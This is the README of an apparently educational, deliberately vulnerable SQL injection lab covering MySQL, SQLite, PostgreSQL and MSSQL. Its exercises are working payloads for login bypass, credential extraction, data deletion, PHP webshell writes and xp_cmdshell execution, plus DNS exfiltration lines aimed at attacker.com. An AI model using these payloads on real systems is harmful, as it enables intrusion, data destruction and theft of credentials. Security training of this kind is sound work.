# 🔓 Polyglot SQL Injection Lab

**⚠️ WARNING: This application contains intentional security vulnerabilities for educational purposes only. DO NOT deploy to production or public internet!**

A comprehensive SQL injection training lab supporting multiple database engines: MySQL, SQLite, PostgreSQL, and MSSQL. Demonstrates various SQL injection techniques from basic authentication bypass to Remote Code Execution (RCE).

## 🎯 Features

### Supported Databases
- **MySQL 8.0** - Error-based, UNION-based, File operations
- **SQLite 3** - ATTACH DATABASE, Schema enumeration
- **PostgreSQL 15** - COPY TO, Out-of-band exfiltration
- **MSSQL 2022** - xp_cmdshell, Command execution

### Vulnerability Types

#### 1. **Blind SQL Injection** (`/login`)
- Boolean-based blind SQLi
- Time-based blind SQLi
- Authentication bypass
- Data extraction character by character

#### 2. **Error-based & UNION-based SQLi** (`/search`)
- Error message exploitation
- UNION-based data extraction
- Information schema enumeration
- Column count detection

#### 3. **Advanced Techniques** (`/report`)
- Stacked queries
- Second-order SQL injection
- Out-of-band (OOB) exfiltration
- SQL injection to RCE

## 🚀 Quick Start

### Prerequisites
- Docker & Docker Compose
- 4GB RAM minimum
- 10GB disk space

### Installation

1. **Clone or navigate to the lab directory:**
```bash
cd sqli-lab
```

2. **Start all services:**
```bash
docker-compose up -d
```

3. **Wait for databases to initialize (30-60 seconds):**
```bash
docker-compose logs -f
```

4. **Access the lab:**
```
http://localhost:8080
```

5. **Switch between databases using the UI or URL parameter:**
```
http://localhost:8080?db=mysql
http://localhost:8080?db=sqlite
http://localhost:8080?db=pgsql
http://localhost:8080?db=mssql
```

### Stopping the Lab
```bash
docker-compose down
```

### Reset Everything (including data)
```bash
docker-compose down -v
rm -f sqli.db
docker-compose up -d
```

## 📚 Lab Exercises

### Lab 1: Login - Blind SQL Injection

**URL:** `http://localhost:8080/login?db=mysql`

**Test Credentials:**
- Username: `admin` | Password: `admin123`
- Username: `john_doe` | Password: `password123`

**Exercise 1.1 - Authentication Bypass:**
```sql
Username: admin' OR '1'='1
Password: anything

Username: ' OR 1=1 -- 
Password: anything
```

**Exercise 1.2 - Boolean-based Blind SQLi:**
```sql
-- Test true condition
Username: admin' AND '1'='1

-- Test false condition
Username: admin' AND '1'='2

-- Extract first character of password
Username: admin' AND SUBSTRING(password,1,1)='a
```

**Exercise 1.3 - Time-based Blind SQLi:**

MySQL:
```sql
Username: admin' AND SLEEP(5) -- 
Username: admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) -- 
```

PostgreSQL:
```sql
Username: admin' AND pg_sleep(5) -- 
```

MSSQL:
```sql
Username: admin'; WAITFOR DELAY '00:00:05' -- 
```

### Lab 2: Search - Error & UNION-based SQLi

**URL:** `http://localhost:8080/search?db=mysql`

**Exercise 2.1 - Detect Vulnerability:**
```sql
Search: '
Search: '' OR 1=1 -- 
```

**Exercise 2.2 - Determine Column Count:**
```sql
Search: ' ORDER BY 1 -- 
Search: ' ORDER BY 6 -- 
Search: ' ORDER BY 7 -- 
```

**Exercise 2.3 - UNION-based Extraction:**

MySQL:
```sql
-- Find injectable columns
Search: ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- 

-- Get database version
Search: ' UNION SELECT VERSION(),NULL,NULL,NULL,NULL,NULL -- 

-- List tables
Search: ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- 

-- Extract user credentials
Search: ' UNION SELECT username,password,email,role,NULL,NULL FROM users -- 

-- Concatenate data
Search: ' UNION SELECT CONCAT(username,':',password),NULL,NULL,NULL,NULL,NULL FROM users -- 
```

SQLite:
```sql
-- List tables
Search: ' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table' -- 

-- Get table schema
Search: ' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='users' -- 

-- Extract credentials
Search: ' UNION SELECT username||':'||password,NULL,NULL,NULL,NULL,NULL FROM users -- 
```

PostgreSQL:
```sql
-- List tables
Search: ' UNION SELECT tablename,NULL,NULL,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public' -- 

-- Extract credentials
Search: ' UNION SELECT username||':'||password,NULL,NULL,NULL,NULL,NULL FROM users -- 
```

MSSQL:
```sql
-- List tables
Search: ' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sysobjects WHERE xtype='U' -- 

-- Extract credentials
Search: ' UNION SELECT username+':'+password,NULL,NULL,NULL,NULL,NULL FROM users -- 
```

**Exercise 2.4 - Error-based Extraction (MySQL):**
```sql
Search: ' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1))) -- 

Search: ' AND updatexml(null,concat(0x7e,database()),null) -- 
```

### Lab 3: Report - Advanced SQLi & RCE

**URL:** `http://localhost:8080/report?db=mysql`

**Exercise 3.1 - Stacked Queries:**

```sql
-- Create new admin user
Title: Test'; INSERT INTO users (username,password,email,role) VALUES ('hacker','hacked','h@ck.com','admin') -- 

-- Update user role
Title: Test'; UPDATE users SET role='admin' WHERE username='john_doe' -- 

-- Delete data
Title: Test'; DELETE FROM reports WHERE id>0 -- 
```

**Exercise 3.2 - SQL Injection to RCE:**

**MySQL - File Write:**
```sql
-- Check privileges
Title: '; SELECT user,file_priv FROM mysql.user WHERE user='sqli_user' -- 

-- Write PHP webshell
Title: '; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/uploads/shell.php' -- 

-- Access webshell
http://localhost:8080/uploads/shell.php?cmd=whoami
http://localhost:8080/uploads/shell.php?cmd=ls -la
```

**PostgreSQL - COPY TO:**
```sql
-- Write file
Title: '; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/uploads/shell.php' -- 

-- Execute command via COPY TO PROGRAM (requires superuser)
Title: '; COPY (SELECT '') TO PROGRAM 'whoami > /tmp/out.txt' -- 
```

**MSSQL - xp_cmdshell:**
```sql
-- Check if enabled
Title: '; SELECT value FROM sys.configurations WHERE name='xp_cmdshell' -- 

-- Execute command
Title: '; EXEC xp_cmdshell 'whoami' -- 
Title: '; EXEC xp_cmdshell 'dir C:\' -- 
```

**SQLite - ATTACH DATABASE:**
```sql
-- Create malicious database file
Title: '; ATTACH DATABASE '/var/www/uploads/shell.php' AS shell; CREATE TABLE shell.pwn (code TEXT); INSERT INTO shell.pwn VALUES ('<?php system($_GET["cmd"]); ?>') -- 
```

**Exercise 3.3 - Out-of-Band Exfiltration:**

**PostgreSQL DNS Exfiltration:**
```sql
Title: '; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT password FROM users LIMIT 1)||'.attacker.com' -- 
```

**MSSQL DNS Exfiltration:**
```sql
Title: '; DECLARE @d varchar(1024); SELECT @d=(SELECT TOP 1 password FROM users); EXEC('xp_cmdshell ''nslookup '+@d+'.attacker.com''') -- 
```

## 🔧 Database-Specific Cheat Sheet

### MySQL
```sql
-- Comments: --, #, /* */
-- Concatenation: CONCAT(), ||
-- Sleep: SLEEP(5)
-- Version: VERSION(), @@version
-- Database: database()
-- User: user(), current_user()
-- Tables: information_schema.tables
-- Columns: information_schema.columns
-- Read file: LOAD_FILE('/path/file')
-- Write file: INTO OUTFILE '/path/file'
```

### SQLite
```sql
-- Comments: --, /* */
-- Concatenation: ||
-- Version: sqlite_version()
-- Tables: sqlite_master
-- No native SLEEP function
-- SQLite time-based delay via cartesian product:
-- username: admin' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) > 0 --
-- ATTACH DATABASE for file operations
```

### PostgreSQL
```sql
-- Comments: --, /* */
-- Concatenation: ||, CONCAT()
-- Sleep: pg_sleep(5)
-- Version: version()
-- Database: current_database()
-- User: current_user
-- Tables: pg_tables, information_schema.tables
-- Columns: information_schema.columns
-- Read file: pg_read_file('/path')
-- Write file: COPY TO '/path'
-- Execute: COPY TO PROGRAM 'command'
```

### MSSQL
```sql
-- Comments: --, /* */
-- Concatenation: +
-- Sleep: WAITFOR DELAY '00:00:05'
-- Version: @@version
-- Database: DB_NAME()
-- User: SYSTEM_USER, USER_NAME()
-- Tables: sysobjects, information_schema.tables
-- Columns: syscolumns, information_schema.columns
-- Execute: xp_cmdshell 'command'
-- DNS: xp_dirtree '\\domain.com\share'
```

## 🛠️ Troubleshooting

### Database won't start
```bash
# Check logs
docker-compose logs mysql
docker-compose logs postgres
docker-compose logs mssql

# Restart specific service
docker-compose restart mysql
```

### MSSQL connection issues
MSSQL requires more memory. Increase Docker memory limit to at least 4GB.

### SQLite database not created
```bash
# The SQLite database is created automatically on first access
# If issues occur, manually initialize:
docker-compose exec web php -r "require '/var/www/html/src/db/sqlite.php'; new SQLiteDB();"
```

### Permission denied errors
```bash
# Fix uploads directory permissions
docker-compose exec web chmod 777 /var/www/uploads
```

### Clear all data and restart
```bash
docker-compose down -v
rm -f sqli.db
docker-compose up -d
```

## 📖 Learning Resources

### SQL Injection References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### Tools for Testing
- **sqlmap** - Automated SQL injection tool
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Web application scanner

### Using sqlmap with this lab
```bash
# Test login form
sqlmap -u "http://localhost:8080/login?db=mysql" --data="username=admin&password=test" --batch

# Test search
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" --batch --dbs

# Dump database
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" --batch -D sqli_db --dump
```

## ⚠️ Security Warning

**THIS APPLICATION IS INTENTIONALLY VULNERABLE!**

- **NEVER** deploy this to a production environment
- **NEVER** expose this to the public internet
- **ONLY** use in isolated lab environments
- **ALWAYS** run in Docker containers with network isolation
- This is for **EDUCATIONAL PURPOSES ONLY**

## 📝 License

Educational use only. No warranty provided.

## 🤝 Contributing

This is an educational project. Feel free to:
- Add more vulnerability examples
- Improve documentation
- Add support for more databases
- Create additional exploitation scenarios

## 📧 Contact

For educational purposes only. Use responsibly!

---

**Remember:** With great power comes great responsibility. Use this knowledge to build secure applications, not to harm others.
